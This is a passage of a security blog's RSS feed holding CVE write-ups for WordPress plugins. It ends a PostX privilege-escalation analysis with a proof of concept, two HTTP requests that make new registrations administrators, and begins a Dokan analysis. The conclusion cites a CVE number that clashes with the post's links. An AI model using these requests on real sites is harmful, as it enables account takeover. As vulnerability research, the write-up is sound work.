to &lt;code&gt;&#39;set&#39;&lt;/code&gt;, the function calls &lt;code&gt;update_option()&lt;/code&gt; to update the option corresponding to &lt;code&gt;$key&lt;/code&gt;, provided the user has the &lt;code&gt;edit_others_posts&lt;/code&gt; capability (which is only available to the &lt;strong&gt;Editor&lt;/strong&gt; role and above). In other cases, the function returns the option value via &lt;code&gt;get_option()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This clearly explains why the vulnerability is disclosed with a required privilege of &lt;strong&gt;Editor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;A common exploitation scenario for a &lt;strong&gt;Privilege Escalation&lt;/strong&gt; vulnerability via the &lt;code&gt;update_option()&lt;/code&gt; function is:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Setting &lt;code&gt;users_can_register = 1&lt;/code&gt; to allow user registration&lt;/li&gt;&#xA;&lt;li&gt;Setting &lt;code&gt;default_role = administrator&lt;/code&gt; so that newly created accounts are granted Administrator privileges&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;However, since this is a REST API using the &lt;strong&gt;POST&lt;/strong&gt; method, when it is called from a browser, the request must include a nonce. For REST requests that modify data (POST / PUT / DELETE), WordPress requires a nonce to prevent CSRF attacks. If the request does not include a nonce, WordPress will reject it with a &lt;code&gt;rest_forbidden&lt;/code&gt; error; if the nonce is invalid, the request will be blocked with a &lt;code&gt;rest_cookie_invalid_nonce&lt;/code&gt; error.&lt;/p&gt;&#xA;&lt;p&gt;To obtain the REST API nonce, it is necessary to log in to the Admin Dashboard and access &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; via the &lt;strong&gt;browser console&lt;/strong&gt; while creating a post, as this nonce is only injected by WordPress into the page when the user is properly authenticated. This is a special case, as it is injected specifically on the post creation page.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;strong&gt;v4.1.36&lt;/strong&gt; patch tightened access control by changing the &lt;code&gt;permission_callback&lt;/code&gt; as follows:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;); // Admins only&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this change, only users with the &lt;code&gt;manage_options&lt;/code&gt; capability (role &lt;strong&gt;Administrator&lt;/strong&gt;) can access the endpoint, effectively preventing exploitation of the &lt;strong&gt;Privilege Escalation&lt;/strong&gt; vulnerability by lower-privileged roles.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Editor (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access Admin / Create Post Page&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress injects wpApiSettings.nonce&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Editor obtains REST API nonce&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;POST /wp-json/ultp/v1/postx_presets/&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;X-WP-Nonce validation&amp;#34;]&#xA;&#xA;F -- Invalid --&amp;gt; G[&amp;#34;Request rejected&amp;#34;]&#xA;F -- Valid --&amp;gt; H[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Access denied&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;postx_presets_callback()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;type == &amp;#39;set&amp;#39;?&amp;#34;}&#xA;K -- No --&amp;gt; L[&amp;#34;get_option()&amp;#34;]&#xA;K -- Yes --&amp;gt; M{&amp;#34;current_user_can(&amp;#39;edit_others_posts&amp;#39;)?&amp;#34;}&#xA;&#xA;M -- No --&amp;gt; N[&amp;#34;Return success without update&amp;#34;]&#xA;M -- Yes --&amp;gt; O[&amp;#34;update_option(key, data)&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Modify sensitive wp_options&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Privilege escalation via default_role / users_can_register&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use an Editor account to create a post&lt;/li&gt;&#xA;&lt;li&gt;Retrieve &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; from the &lt;strong&gt;browser console&lt;/strong&gt; to obtain the nonce&lt;/li&gt;&#xA;&lt;li&gt;Send a request using the obtained nonce:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 1&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=users_can_register&amp;amp;data=1&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 2&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=default_role&amp;amp;data=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#34; title=&#34;Default role&#34; data-thumbnail=&#34;/posts/2026-01-05-cve-2025-55707/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Default role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#39; alt=&#34;Result&#34; height=&#34;883&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Default role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Create a new user and log in&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE-2025-53425 vulnerability stems from an &lt;strong&gt;inconsistent combination of permission checks at the REST API level and the logic implemented within the callback&lt;/strong&gt;. Although the REST endpoint only requires the &lt;code&gt;edit_posts&lt;/code&gt; capability, the most dangerous operation (&lt;code&gt;update_option()&lt;/code&gt;) is guarded by &lt;code&gt;edit_others_posts&lt;/code&gt;, allowing an &lt;strong&gt;Editor&lt;/strong&gt; to modify sensitive entries in the &lt;code&gt;wp_options&lt;/code&gt; table. When combined with a valid REST API nonce, an Editor can abuse this endpoint to alter critical options, resulting in &lt;strong&gt;Privilege Escalation&lt;/strong&gt;. The patch in version &lt;code&gt;4.1.36&lt;/code&gt; fully mitigates this issue by restricting endpoint access to users with the &lt;code&gt;manage_options&lt;/code&gt; capability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt; must &lt;strong&gt;accurately reflect the sensitivity of the operations performed in the callback&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; is a &lt;strong&gt;highly dangerous function&lt;/strong&gt; if not strictly permission-restricted&lt;/li&gt;&#xA;&lt;li&gt;REST API nonces &lt;strong&gt;only mitigate CSRF&lt;/strong&gt;, they do not replace proper authorization checks&lt;/li&gt;&#xA;&lt;li&gt;Editors &lt;strong&gt;should not&lt;/strong&gt; be allowed to modify global options that affect the entire system&lt;/li&gt;&#xA;&lt;li&gt;The most effective fix is to &lt;strong&gt;enforce strict permissions at the REST endpoint level&lt;/strong&gt;, rather than performing scattered checks within the callback&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-post/vulnerability/wordpress-postx-plugin-4-1-35-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin &amp;lt;= 4.1.35 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-04-cve-2025-53425/</link>
      <pubDate>Sun, 04 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-04-cve-2025-53425/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt; vulnerability in &lt;strong&gt;Dokan, Inc. Dokan dokan-lite&lt;/strong&gt; allows &lt;strong&gt;Privilege Escalation&lt;/strong&gt;. This issue affects &lt;strong&gt;Dokan&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; through &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Shop manager&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/dokan-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Dokan&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;The plugin &lt;strong&gt;requires WooCommerce to operate&lt;/strong&gt;, as it &lt;strong&gt;integrates and works directly with WooCommerce&lt;/strong&gt; to manage &lt;strong&gt;products, orders, and the payment workflow&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_dokan_save_settings&amp;#39;, [ $this, &amp;#39;save_settings_value&amp;#39; ], 10 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; is a hook for &lt;strong&gt;authenticated users&lt;/strong&gt;.&#xA;When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=dokan_save_settings&lt;/code&gt;, the callback &lt;code&gt;save_settings_value()&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_settings_value() {&#xA;    try {&#xA;        if ( ! current_user_can( &amp;#39;manage_woocommerce&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_unauthorized_operation&amp;#39;, __( &amp;#39;You are not authorized to perform this action.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 401 );&#xA;        }&#xA;&#xA;        if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( sanitize_key( wp_unslash( $_POST[&amp;#39;nonce&amp;#39;] ) ), &amp;#39;dokan_admin&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_invalid_nonce&amp;#39;, __( &amp;#39;Invalid nonce&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 403 );&#xA;        }&#xA;&#xA;        if ( empty( $_POST[&amp;#39;section&amp;#39;] ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_error_saving&amp;#39;, __( &amp;#39;`section` parameter is required.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;        }&#xA;&#xA;        $option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;        $option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; ); // phpcs:ignore&#xA;        $option_value = apply_filters( &amp;#39;dokan_save_settings_value&amp;#39;, $option_value, $option_name );&#xA;        $old_options  = get_option( $option_name, [] );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_before_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        update_option( $option_name, $option_value );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_after_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        // only flush rewrite rules if store url has been changed&#xA;        if ( &amp;#39;dokan_general&amp;#39; === $option_name &amp;amp;&amp;amp; isset( $old_options[&amp;#39;custom_store_url&amp;#39;] ) &amp;amp;&amp;amp; $old_options[&amp;#39;custom_store_url&amp;#39;] !== $option_value[&amp;#39;custom_store_url&amp;#39;] ) {&#xA;            dokan()-&amp;gt;rewrite-&amp;gt;register_rule();&#xA;            flush_rewrite_rules();&#xA;        }&#xA;&#xA;        wp_send_json_success(&#xA;            [&#xA;                &amp;#39;settings&amp;#39; =&amp;gt; [&#xA;                    &amp;#39;name&amp;#39;  =&amp;gt; $option_name,&#xA;                    &amp;#39;value&amp;#39; =&amp;gt; apply_filters( &amp;#39;dokan_get_settings_values&amp;#39;, $this-&amp;gt;sanitize_options( $option_value, &amp;#39;read&amp;#39; ), $option_name ),&#xA;                ],&#xA;                &amp;#39;message&amp;#39;  =&amp;gt; __( &amp;#39;Setting has been saved successfully.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ),&#xA;            ]&#xA;        );&#xA;    } catch ( Exception $e ) {&#xA;        $error_code = $e-&amp;gt;getCode() ? $e-&amp;gt;getCode() : 422;&#xA;&#xA;        wp_send_json_error( new WP_Error( &amp;#39;dokan_settings_error&amp;#39;, $e-&amp;gt;getMessage() ), $error_code );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function checks user privileges using:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;manage_woocommerce&amp;#39; )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt; is a &lt;strong&gt;capability registered by WooCommerce&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This capability is defined in 